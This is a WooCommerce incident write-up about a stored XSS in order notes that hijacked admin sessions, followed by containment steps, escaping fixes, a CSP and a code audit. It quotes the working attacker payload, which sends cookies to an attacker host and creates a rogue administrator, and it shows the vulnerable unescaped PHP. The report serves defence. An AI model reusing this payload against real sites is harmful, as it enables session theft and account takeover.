@@ -1,0 +1,200 @@
+Bug Title / Short Description (one liner) : "Someone is hijacking admin sessions — a rogue admin account appeared that nobody created"
+Bug category: Security & Permissions
+
+
+Description: 
+A WooCommerce store owner reported that whenever an admin visited the order management panel, their browser session was being silently hijacked — admins would find themselves logged out moments later, and on two occasions a new administrator-level user appeared in the system that nobody had created. The problem was intermittent and seemed tied specifically to viewing orders with customer-submitted notes.
+
+
+
+Main Cause:
+A Stored Cross-Site Scripting (XSS) vulnerability existed in the order notes field. The custom order notes meta box was rendering customer-submitted content in the WooCommerce admin panel without escaping the output. An attacker had discovered this and was submitting orders with JavaScript payloads embedded in the notes field. Every time an admin viewed the order, the payload executed in their browser context — with full admin cookie access — stealing the session and silently creating a new admin account using the victim's own authenticated session.
+
+
+The malicious payload found embedded in order notes:
+
+javascript// Decoded payload stored in order note comment_content:
+
+<img src=x onerror="
+    fetch('https://attacker-site.com/steal?c=' + document.cookie);
+    fetch('/wp-admin/user-new.php', {
+        method: 'POST',
+        credentials: 'include',
+        body: new URLSearchParams({
+            action:              'createuser',
+            user_login:          'support_backup',
+            email:               'attacker@evil.com',
+            pass1:               'P@ssw0rd123!',
+            pass2:               'P@ssw0rd123!',
+            role:                'administrator',
+            _wpnonce_create-user: document.querySelector('[name=_wpnonce_create-user]').value
+        })
+    });
+">
+
+
+
+
+
+
+
+
+What We Did:
+
+
+
+
+Step 1 — Immediate containment — delete rogue accounts and invalidate all sessions:
+
+# Delete rogue admin accounts immediately
+wp user delete support_backup --yes
+
+# Force-reset ALL admin passwords to random values
+wp user list --role=administrator --field=ID | \
+    xargs -I{} wp user update {} --user_pass=$(openssl rand -base64 16)
+
+# Destroy ALL active sessions across the entire site
+wp eval 'WP_Session_Tokens::destroy_all_for_all_users();'
+
+# Rotate WordPress secret keys and salts
+wp config shuffle-salts
+
+
+
+
+
+
+Step 2 — Found the unescaped output in the order notes rendering template:
+// The vulnerable code found in custom-wc-notes/admin-notes.php
+
+// VULNERABLE — raw unescaped output of customer-submitted content
+
+foreach ($order_notes as $note) {
+    echo '<li class="note">';
+    echo '<div class="note_content">';
+    echo $note->comment_content; // Direct echo of DB content — XSS vector
+    echo '</div>';
+    echo '</li>';
+}
+
+
+
+
+
+
+Step 3 — Fixed all output with proper contextual escaping:
+// AFTER — Every dynamic value escaped with the correct function for its context
+
+foreach ($order_notes as $note) {
+    echo '<li class="note">';
+    echo '<div class="note_content">';
+
+    // wp_kses() — allows only a defined safe subset of HTML tags
+    // Never use esc_html() on content that legitimately needs formatting
+    // Never use wp_kses_post() on customer input — that's too permissive
+    echo wp_kses($note->comment_content, [
+        'strong' => [],
+        'em'     => [],
+        'br'     => [],
+        'p'      => [],
+        'a'      => ['href' => [], 'title' => []],
+    ]);
+
+    echo '</div>';
+    echo '<p class="meta">';
+    // esc_html() for plain text values — strips ALL tags
+    echo 'By: '  . esc_html($note->comment_author);
+    echo ' on '  . esc_html(
+        date_i18n(get_option('date_format'), strtotime($note->comment_date))
+    );
+    echo '</p>';
+    echo '</li>';
+}
+
+
+
+
+
+
+Step 4 — Sanitized data on the way INTO the database, not just on output:
+
+
+// Sanitize ALL order note content before it is ever written to the DB
+add_filter('woocommerce_new_order_note_data', function($commentdata) {
+
+    // Strip everything except basic formatting — no scripts, no iframes, no events
+    $commentdata['comment_content'] = wp_kses(
+        $commentdata['comment_content'],
+        [
+            'strong' => [],
+            'em'     => [],
+            'br'     => [],
+            'p'      => [],
+        ]
+    );
+    return $commentdata;
+});
+
+// Also sanitize on checkout submission before note is created
+add_action('woocommerce_checkout_order_processed', function($order_id, $posted_data) {
+    if (isset($posted_data['order_comments'])) {
+        // sanitize_textarea_field strips all HTML — plain text only for checkout notes
+        $safe_note = sanitize_textarea_field($posted_data['order_comments']);
+        wc_create_order_note($order_id, $safe_note, false, true);
+    }
+}, 10, 2);
+
+
+
+
+
+
+
+Step 5 — Added a Content Security Policy header to limit XSS blast radius:
+
+// functions.php — CSP header for admin area
+add_action('send_headers', function() {
+    if (is_admin()) {
+        header("Content-Security-Policy: " . implode('; ', [
+            "default-src 'self'",
+            "script-src 'self' 'unsafe-inline' https://ajax.googleapis.com",
+            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
+            "img-src 'self' data: https:",
+            "connect-src 'self'",
+            "font-src 'self' https://fonts.gstatic.com",
+            "object-src 'none'",
+            "base-uri 'self'",
+            "form-action 'self'", // Prevents form action hijacking
+        ]));
+    }
+});
+
+
+
+
+
+
+Step 6 — Audited the entire codebase for other unescaped output points:
+
+# Find all raw echo statements that output dynamic data without escaping
+grep -rn "echo \$" /var/www/html/wp-content/plugins/custom-* \
+    | grep -v "esc_\|wp_kses\|intval\|absint\|sanitize" \
+    | grep -v "^.*//.*echo" \
+    > /tmp/xss_audit_report.txt
+
+# Specifically hunt for direct output of superglobals — highest risk
+grep -rn "echo \$_POST\|echo \$_GET\|echo \$_REQUEST\|echo \$_SERVER" \
+    /var/www/html/wp-content/ >> /tmp/xss_audit_report.txt
+
+echo "Potential XSS vectors found: $(wc -l < /tmp/xss_audit_report.txt)"
+
+
+
+
+
+
+
+The two rogue admin accounts were deleted and the XSS vector patched within 90 minutes. A full audit found 7 additional unescaped output points across the custom plugin suite — all fixed within the same day. 
+
+
+
